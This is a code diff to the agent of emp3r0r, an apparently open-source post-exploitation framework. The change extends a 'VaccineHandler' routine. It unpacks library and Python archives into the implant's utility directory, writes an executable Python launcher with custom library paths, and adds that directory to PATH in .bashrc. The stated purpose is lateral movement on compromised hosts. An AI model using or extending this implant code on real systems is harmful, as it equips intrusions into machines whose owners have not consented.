@@ -8,6 +8,7 @@ install tools to emp3r0r_data.UtilsPath, for lateral movement
 
 import (
 	"fmt"
+	"io/ioutil"
 	"log"
 	"os"
 	"strings"
@@ -15,6 +16,22 @@ import (
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/mholt/archiver"
+)
+
+var (
+	PythonArchive = emp3r0r_data.UtilsPath + "/python3.9.tar.xz"
+	PythonLib     = emp3r0r_data.UtilsPath + "/python3.9"
+	PythonPath    = fmt.Sprintf("%s:%s:%s", PythonLib, PythonLib+"/lib-dynload", PythonLib+"/site-packages")
+
+	// run python scripts with this command
+	// LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/home/u/alpine/lib PYTHONPATH="/tmp/python3.9:/tmp/python3.9/site-packages:/tmp/python3.9/lib-dynload" /tmp/python3
+	PythonCmd = fmt.Sprintf("PYTHONPATH=%s PYTHONHOME=%s "+
+		"LD_LIBRARY_PATH=%s:/usr/lib:/lib:/lib64:/usr/lib64:/usr/lib32 %s ",
+		PythonPath, PythonLib, emp3r0r_data.LibPath,
+		emp3r0r_data.UtilsPath+"/python3")
+
+	// run python itself with this script
+	PythonLauncher = fmt.Sprintf("#!%s\n%s"+`"$@"`+"\n", emp3r0r_data.DefaultShell, PythonCmd)
 )
 
 func VaccineHandler() (out string) {
@@ -40,7 +57,27 @@ func VaccineHandler() (out string) {
 		log.Printf("Unarchive: %v", err)
 		return fmt.Sprintf("Unarchive: %v", err)
 	}
-	_ = os.Remove(emp3r0r_data.AgentRoot + "/utils.tar.bz2")
+	os.RemoveAll(emp3r0r_data.LibPath) // archiver fucking aborts when files already exist
+	if err = archiver.Unarchive(emp3r0r_data.UtilsPath+"/libs.tar.xz", emp3r0r_data.AgentRoot); err != nil {
+		log.Printf("Unarchive: %v", err)
+		out = fmt.Sprintf("Unarchive libs: %v", err)
+	}
+
+	// extract python3.9.tar.xz
+	os.RemoveAll(PythonPath)
+	if util.IsFileExist(PythonArchive) {
+		if err = archiver.Unarchive(PythonArchive, emp3r0r_data.UtilsPath); err != nil {
+			out = fmt.Sprintf("Unarchive python libs: %v", err)
+			log.Print(out)
+			return
+		}
+		// create launchers
+		err = ioutil.WriteFile(emp3r0r_data.UtilsPath+"/python", []byte(PythonLauncher), 0755)
+		if err != nil {
+			out = fmt.Sprintf("Write python launcher: %v", err)
+		}
+	}
+	os.Remove(emp3r0r_data.AgentRoot + "/utils.tar.bz2")
 
 	// update PATH in .bashrc
 	exportPATH := fmt.Sprintf("export PATH=%s:$PATH", emp3r0r_data.UtilsPath)
